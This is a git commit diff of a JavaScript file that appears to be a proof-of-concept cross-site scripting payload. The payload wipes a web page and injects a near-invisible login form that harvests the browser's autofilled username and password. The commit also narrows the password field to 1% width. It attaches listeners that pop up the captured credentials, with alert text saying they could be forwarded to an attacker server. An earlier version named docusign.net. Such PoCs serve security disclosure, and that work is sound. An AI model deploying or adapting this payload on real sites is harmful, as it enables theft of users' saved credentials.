ebca2c766695ed36b83213a51dc696fd99a41c0a
Walid Hossain <32749515+Walidhossain010@users.noreply.github.com>
2024-06-04 11:35:16 +0600

    Update index.js

--- index.js
+++ index.js
@@ -1,29 +1,23 @@
-// Clear the entire document body
 document.body.innerHTML = "";
-
-// Remove all <style> tags
 var styleTags = document.querySelectorAll('style');
 styleTags.forEach(function(style) {
-    style.parentNode.removeChild(style);
+ style.parentNode.removeChild(style);
 });
+var scriptss = document.scripts;
 
-// Remove all <script> tags
-var scripts = document.scripts;
-for (var i = scripts.length - 1; i >= 0; i--) {
-    var script = scripts[i];
-    script.parentNode.removeChild(script);
+for (var i = scriptss.length - 1; i >= 0; i--) {
+ var script = scriptss[i];
+ script.parentNode.removeChild(script);
 }
 
-// Add a new <style> tag to hide all elements except form and textarea
 var s = document.createElement('style');
 var c = 'body > *:not(form):not(textarea) { display: none !important; }';
 s.appendChild(document.createTextNode(c));
 document.head.appendChild(s);
 
-// Create the form element
+
 var form = document.createElement('form');
 
-// Create the username input field
 var inputName = document.createElement('input');
 inputName.type = 'text';
 inputName.id = 'username';
@@ -34,9 +28,8 @@ inputName.style.border = "none";
 inputName.style.outline = "none";
 inputName.style.background = "none";
 inputName.style.width = "100%";
-inputName.classList.add("single-input");
+inputName.classList.add("single-input")
 
-// Create the password input field
 var inputPassword = document.createElement('input');
 inputPassword.type = 'password';
 inputPassword.id = 'password';
@@ -45,31 +38,38 @@ inputPassword.autocomplete = 'current-password';
 inputPassword.style.border = "none";
 inputPassword.style.outline = "none";
 inputPassword.style.background = "none";
-inputPassword.style.width = "100%"; // Adjusted width to be visible
-inputPassword.classList.add("single-input");
+inputPassword.style.padding = "0";
+inputPassword.style.width = "1%";
+inputPassword.classList.add("single-input")
 
-// Append the input fields to the form
+
 form.appendChild(inputName);
 form.appendChild(inputPassword);
 
-// Append the form to the document body
 document.body.appendChild(form);
 
-// Set a timeout to add event listeners
+// Assuming you have an <input> element with an ID of "myInput"
+var inputElement = document.getElementById("username");
+
+
+
 setTimeout(function() {
-    let a = document.getElementsByName('username')[0];
-    let b = document.getElementsByName('password')[0];
+ let a = document.getElementsByName('username')[0];
+ let b = document.getElementsByName('password')[0];
 
-    function f() {
-        if (b.value.length > 0) {
-            alert(`Here are the user credentials for docusign.net: Username = ${a.value}, Password = ${b.value}`);
-        }
-    }
-
-    a.addEventListener('click', function() {
-        // Trigger the input event to fill the password field with saved credentials
-        b.focus();
-        b.blur();
-        f();
-    });
+ function f() {
+  if (b.value.length > 0) {
+   alert(`Here is user credentials that can be forwarded into attacker server(I implemented the poc in this way to prevent your credentials from being redirected to my website): $ {
+    (a.value)
+   },
+   Password = $ {
+    (b.value)
+   }`);
+  }
+ }
+ a.form.onclick = f;
+ a.onchange = f;
+ b.onchange = f;
+ a.oninput = f;
+ b.oninput = f;
 }, 1000);
